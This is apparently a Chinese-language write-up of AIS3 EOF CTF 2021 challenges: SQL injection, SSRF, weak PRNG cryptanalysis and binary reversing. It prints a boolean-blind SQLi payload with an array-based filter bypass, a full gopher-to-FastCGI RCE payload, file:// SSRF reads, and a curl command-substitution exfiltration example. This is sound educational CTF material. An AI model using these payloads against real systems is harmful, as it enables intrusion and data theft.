
# AIS3 EOF CTF 2021
## Happy Metaverse Year
### 解題流程：
### 頁面測試
- 經過一個很酷炫的 SAO 登入頁面後可以看到彈出登入畫面如下，另外也可以看到自己的 IP，顯示在頁面下方。

    ![](https://i.imgur.com/6mSqsyA.png)

- 在帳號密碼欄隨便輸入按下 enter 後可以看到應該是帳號密碼不對。

    ![](https://i.imgur.com/dlRukg1.png)
    
### 追 souce code
- 另外題目有附 source code，打開來看一下。

- 看到是使用 sqlite，創建了一個 user 資料表，存了一筆 ('kirito', 'FLAG{${FL4G}}', '48.76.33.33')，其中 FLAG 就是我們的目標，中間字串看起來是從 static file 引入的。

    ![](https://i.imgur.com/rLMHV9K.png)
    
- 再來往下看到 login 的地方，可以看到查詢的 sql 語法，題目有提示是 sql injection，所以就是要利用這邊的 sql 查詢做一些壞壞的事。

- 而下面的判斷比對了 user.password === 使用者輸入passwd、user.ip === request IP，true 就導至 welcome 頁面，false 就跳到 failed 頁面，也就是我們前面隨便輸入跳出的頁面。

    ![](https://i.imgur.com/ltFJdfl.png)
    
### sql injection(Boolean Based Blind)
- 再來就是想辦法做到 sqli 了，在接到使用者輸入的 username 跟 password 後，會過一個判斷有無 ' 字元的 WAF。

- 自己用 Express 架了一個本地 server 用 Burp 攔截並修改封包來做 sqli 的測試。

- 嘗試了 unicode smuggling，依然沒法成功繞過 WAF，被當成純字串處理了。

    ![](https://i.imgur.com/YTxPNpw.png)
    ![](https://i.imgur.com/UO3sTvA.png)

- 嘗試看看 username 參數送陣列會發生什麼事，BINGO，成功繞過 WAF 了，陣列內容被合併成字串了，而且 type 變成 object，if (username?.includes("'") || password?.includes("'")) 的判斷也因此失效。

    ![](https://i.imgur.com/U6HJWRw.png)
    
    ![](https://i.imgur.com/PGCh547.png)

- 再來就是用 union select 替換掉 username, password, IP，就可以看到成功進入到 welcome 了。

    ![](https://i.imgur.com/6iT32vO.png)
    
    ![](https://i.imgur.com/7qsHiNK.jpg)

- 因為我們的 FLAG 是原密碼，所以能想到要用 boolean based blind sqli 來將 passwod 的字原轉成 int 比對大小來一個個解出原文。

- sqli 會長的像下面這樣，因為 FLAG{ 前面是固定的，我們只需要從第 6 個開始比，若比對結果為 true，IP 那欄會存自己的 IP，就可以判斷成功，進入 welcome，若為 false 則會判斷失敗，進入 falied。

    ```username[]=xxx' union select "kirito", "test", case when (unicode(substr((select password from users where username="kirito") ,6,1))) > 320 then "36.224.128.66" else "0" end as ip --&password=test```
### Binary search sqli 腳本
- 嘗試確實可以後，寫一個腳本來做自動化 sqli，不然不知道原文字多少個，轉成 int 的大小，如果是unicode 的中文字或奇怪符號，到幾萬都有可能。

- 腳本如下，長度稍微測一下，最後的字原是 "}" ，就能知道是 29，迴圈下去每次用 binary serch 去逼近最終值，chr() 轉成字原，就能看到 FLAG 啦！

    ![](https://i.imgur.com/5i00D2a.png)
    
    ![](https://i.imgur.com/eCSyxDA.png)

### FLAG 截圖：
![](https://i.imgur.com/eCSyxDA.png)

## PM

### 解題思路

好棒，PM。

![](https://i.imgur.com/iP0WOjR.jpg)

首先我們有一個 webshell.php，但是不能執行 shell QQ（錯誤訊息是 system 被 ban 了`Warning: system() has been disabled for security reasons in ...`，這很重要，先記著），不過可以看檔案，因此看一下 webshell.php 的 code，發現他的這個功能會用到 curl，因此可能可以 ssrf？

![](https://i.imgur.com/xbzFCUy.png)

我們再翻一下他的 nginx 設定檔，可以看到有 fastcgi，因此可以用 gopher + ssrf 去戳 fastcgi 達到 RCE 的效果。

![](https://i.imgur.com/gG2ZweK.png)

這邊使用 gopherus 去產生 payload，但是發現無法成功執行，經過了一些~~通靈~~仔細尋找之後，發現 gopherus 預設是用 system 去執行 command，而前面提到它被 ban 了，所以這邊自己修一下，改成 exec 或隨便一個類似的函數就可以了。

但成功 RCE 後，不知道為什麼沒辦法直接用他的 download webshell 的功能加上 webshell viewer 直接看到 command 的 output（直接將 command output download 成一個檔案），所以嘗試用 curl + command substitution（e.g. `curl {server}?a=$(cat /flag)`）把結果回傳到自己的 server，又不知為何無法執行（單純 curl 時可以，推測是 url encode 導致壞掉） QQ，因此最後用 output redirect 的方式直接將 command output 寫入檔案中（e.g. `ls > /tmp/HI`），即可成功看到 FLAG。

最終 payload 如下，透過位於 9000 的 fastcgi 去執行 /readflag，成功讀取到 flag 並將輸出導向到某個檔案，再用 webshell.php 去看那個檔案內容得到 FLAG。

### payload

```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH118%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00v%04%00%3C%3Fphp%20exec%28%27/readflag give me the flag > /tmp/peko%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

## SSRF Challenge or Not?

### 解題思路

這題是一個 proxy，所以先嘗試用一些常見的協定去戳 SSRF，發現 file 協定可以用（其他協定大多都是寫無此協定，而 file 的錯誤訊息不一樣，因此推測能用）。

![](https://i.imgur.com/LJdg0HY.png)

錯誤訊息寫 netloc 不能為空，查一下 urlparse 的文件後發現是 hostname，因此填上 127.0.0.1。

![](https://i.imgur.com/eNbpauq.png)

又發現不能用 127.0.0.1，改用別名 bypass。

![](https://i.imgur.com/ZW3UXIe.png)

成功讀到檔案！

接著嘗試讀一些 /proc 裡面的檔案，看能不能找到一些有用的資訊，接著在 /proc/mounts 裡面，發現 mount 了一個看起來很像 flag 的。

![](https://i.imgur.com/YT6WOZ3.png)

打開就是了！

![](https://i.imgur.com/CzRq4pt.png)


## babyPRNG

這是一題簡單的假亂數，我們先來觀察一下他的random，_random的部分進行了大量的白工。在透過四個步驟tmp的移動跟&後，最後他回到了原位。並且前8bits除了2^8、2^6以外全部都是0了。傑出的一手。
再來我們看到random，他對產生的亂數進行了&1，使其只留有1個bit，並且之後將其乘上2^6。



```=python
import random
import string

charset = string.ascii_letters + string.digits + '_{}'

class MyRandom:
    def __init__(self):
        self.n = 2**256
        self.a = random.randrange(2**256)
        self.b = random.randrange(2**256)

    def _random(self):
        tmp = self.a
        self.a, self.b = self.b, (self.a * 69 + self.b * 1337) % self.n
        tmp ^= (tmp >> 3) & 0xde
        tmp ^= (tmp << 1) & 0xad
        tmp ^= (tmp >> 2) & 0xbe
        tmp ^= (tmp << 4) & 0xef
        return tmp

    def random(self, nbit):
        return sum((self._random() & 1) << i for i in range(nbit))

random_sequence = []
for i in range(6):
    rng = MyRandom()
    random_sequence += [rng.random(8) for _ in range(10)]
```
好的，觀察完後我們來整理一下。
* 1.整個亂數進行移動後只會留下2個位置的數字，其餘都會被mask掉。
* 2.亂數還會自己變成1bits後才去進行乘法。

結合以上兩點我們知道，兩個位置的字元*一次1bit一共就是4種排列組合00、01、10、11，也因此，他扔出來的亂數也就是4個亂數。因此，直接把他print出來，數字一定排列組合只有4種。

![](https://i.imgur.com/9whdr5s.png)

看起來只有這四個[182、109、219、0]，這甚至也不用寫東西去解他，多按幾下就出來了，畢竟byte mapping ascii的範圍只有4，隨便map都一定轉不過去，唯一轉的過去的就一定是FLAG了。

```=python
import random
import string
print(random_sequence)
flag = bytes.fromhex(
    '9dfa2c9ccd5c84c61feb00ea835e848732ac8701da32b5865a84db59b08532b6cf32ebc10384c45903bf860084d018b5d55a5cebd832ef8059ead810')
ciphertext = bytes([x ^ y for x, y in zip(flag, random_sequence)])
print(bytes(ciphertext))

#FLAG{1_pr0m153_1_w1ll_n07_m4k3_my_0wn_r4nd0m_func710n_4641n}
```

好的，輕鬆愉快的crypto觀察日記。真希望這種能用看的題目多來點，數學真的很麻煩nya~


## almostBabyPRNG

進階版來啦~原理跟上一題差不多，我的天這次用了三組同時做加密。但是大方向是不變的。事實上這樣的加密方式已經滿好的了，因為8bits*2個數字*3組=48bits。這想跟上一題一樣爆出來已經是不可能了。
* 1.整個亂數進行移動後只會留下2個位置的數字，其餘都會被mask掉。
* 2.亂數會進行布林運算之後取8bits。

```=python
from flag import flag
import random

class MyRandom:
	def __init__(self):
		self.n = 256
		self.a = random.randrange(256)
		self.b = random.randrange(256)

	def random(self):
		tmp = self.a
		self.a, self.b = self.b, (self.a * 69 + self.b * 1337) % self.n
		tmp ^= (tmp >> 3) & 0xde
		tmp ^= (tmp << 1) & 0xad
		tmp ^= (tmp >> 2) & 0xbe
		tmp ^= (tmp << 4) & 0xef
		return tmp

class TruelyRandom:
	def __init__(self):
		self.r1 = MyRandom()
		self.r2 = MyRandom()
		self.r3 = MyRandom()

	def random(self):
		def rol(x, shift):
			shift %= 8
			return ((x << shift) ^ (x >> (8 - shift))) & 255

		o1 = rol(self.r1.random(), 87)
		o2 = rol(self.r2.random(), 6)
		o3 = rol(self.r3.random(), 3)
		o = (~o1 & o2) ^ (~o2 | o3) ^ (o1)
		o &= 255
		return o

assert len(flag) == 36

rng = TruelyRandom()
random_sequence = [rng.random() for _ in range(420)]

for i in range(len(flag)):
	random_sequence[i] ^= flag[i]

open('output.txt', 'w').write(bytes(random_sequence).hex())


```


然而布林運算實在是太無情啦wwww，這加密法用的布林運算式一看就知道能化簡。並且能化簡的布林運算式進行加密後那就是一定具有重複性啦。
我們首先看到，這題的FLAG長度是36，但是他給我們的random_sequence是420。那表示說，輸出的檔案只有前36個字元是加密過的，其他都是透過這個假亂數產生出來的。

我們可以自己產生一組random_sequence來看看，會發現它每384次是一個循環，第385次產生的亂數相當於第1次產生的亂數。

![](https://i.imgur.com/rD6hKwN.png)

好讚，現在只要後面這串跟它加密過後的random_sequence來一個XOR，flag就出來了。

```=python
flag="d5de8acdc0fa83d9c5bbe683cb33ef07949d6faeee8b00f6a2cc10cad800ca818e1cfd34f96f8fe71c9dbb3930ec8fb89183c9eef059cddcdc62a3fcf96eaea6dcab1bde96db8dbb13e3eb5d144fec9c6c91637cffdb0d8c988c2a189a8aaeaa136afe8cd469dddedf88ed7effbf2fd89e8f8afa88beb9ba1150eaaec0c8fdb5d4fbe3efff8ca866ecbf2bda996a7f9e136d6d6e1afbccb664e24d5ef98e9fa63e8d8b3a385aef999389d9dcfbe9f8f6d4908bdaf9bdbd8dfeaebafea28aca8c9181cb8ca8cbc9a6f48893dcf94b8b4efca91a8ab1a84f9893ac4fafb86ee9dbff7a9949ff6e8fe40a9daa2c30ea99b89383c9ecf459d8d8dc66a1fcff6daeb4caab0ad896c88cbb11e3eb4c134ff9886c84617cf9cf0d8b9d8c3b189a88adaa117dfe8ac369c8c9df88f87ef9ad2fce9f8f9be988a9adba1343eabbd6c8e8b4d4eaf2eff989a865febf3acb996c6d9e11696d6c1afbd9b664e64b5eff899fb42c8d9a383849ea99918dd9cdf8e9ede6d4858ddaffadbd8affaeabfaa288cd8c9392cb8abbcbdcb5f48882dcff5d8b58f9a90b9db1bf5f9891bb4fbaaa6efcdeff6b8c49"
h=   "9392cb8abbcbdcb5f48882dcff5d8b58f9a90b9db1bf5f9891bb4fbaaa6efcdeff6b8c49"
flag=bytes.fromhex(flag)
h=bytes.fromhex(h)
# 我丟網站XOR了
dec="464c41477b315f6c3133645f346e645f6d3464335f345f6e33775f70726e365f7177717d"
dec=bytes.fromhex(dec)
print(dec)
```

卡諾圖畫了一輩子才確定這傢伙的重複性只有384，它再多來個NOR、NAND之類的我就真的沒轍了。
![](https://i.imgur.com/e1lvIze.png)


## wannaSleep

好棒，最擅長的reverse環節。起手IDA直接main開看。首先來看看，嗯?它需要一個元素。

![](https://i.imgur.com/yyw4bHZ.png)
再來又在一個字串後面接上.enc，並且有一個function還會用到我們輸入的字串。
![](https://i.imgur.com/upGFkWF.png)
它的題目包裡面還送了一個檔案而且是.enc耶，好巧
![](https://i.imgur.com/ROgh7O7.png)
廢話少說先吃我一發餵檔案。
![](https://i.imgur.com/XXipZF4.png)
好的，非常感謝你。
![](https://i.imgur.com/eKwcTXv.png)
沒什麼結論，大概只要知道argc跟.enc就會想做的直覺操作，所以滿快的。


## passwd_checker_2022
一個看似簡單的猜密碼，但是把button給鎖住了，連玩的機會都不給。總之第一步先解鎖。

![](https://i.imgur.com/X76gKwA.png)


我們直接找到控制開關的rdx，改成true。
![](https://i.imgur.com/CjlaF8o.png)

來試玩看看，看起來我們需要找到正確的pwd。

![](https://i.imgur.com/VuYzWHS.png)



我們可以發現，在彈出Failed視窗前x64dbg有對RAX、RCX進行比較，而其中RAX是我們傳入的pwd他經過某種加密後的值，而RCX則是某個字串，我們大膽猜測這就是密碼比對的部分。
![](https://i.imgur.com/FFsACUf.png)


從IDA來看，這裡的確有加密以及字串比對的痕跡。
![](https://i.imgur.com/OIu6uvV.png)

但是我們往上追，他除了彈出視窗外就沒有行為了，因此我們可以判斷，他不是密碼正確就會出FLAG的類型，因此我將"FLAG{"當成密碼輸入。
![](https://i.imgur.com/eZUBNvd.png)

發現加密後的前幾碼是一樣的，好棒。我們現在有逆推跟暴力兩種選擇。
![](https://i.imgur.com/kieg1xe.png)

有的時候暴力也是一種最快的方法，你看，我只花了兩小時 0w0
![](https://i.imgur.com/AcQoo1s.png)




## 額外贈送 CMTSecurityCTF-Crypto
HITCON上怎麼這麼多東西能玩，然後我為什麼又來解crypto了。

總之，一大堆詭異的編碼，這網頁出來會是一堆異世界文字。
![](https://i.imgur.com/QfOyb0Q.png)


![](https://i.imgur.com/K121Gxp.jpg)
解個百年都不會知道，我看起來像是語言學家嗎?
但是我們仔細瞧瞧，這裡面有一些東西呢!怎麼會有下底線0w0

![](https://i.imgur.com/05yPaQy.png)

再看看，還有一個冒號，等等，我彷彿想到了什麼。

![](https://i.imgur.com/2u0p9T8.png)

好的，你好替換式密碼。
![](https://i.imgur.com/3tXsvCL.png)


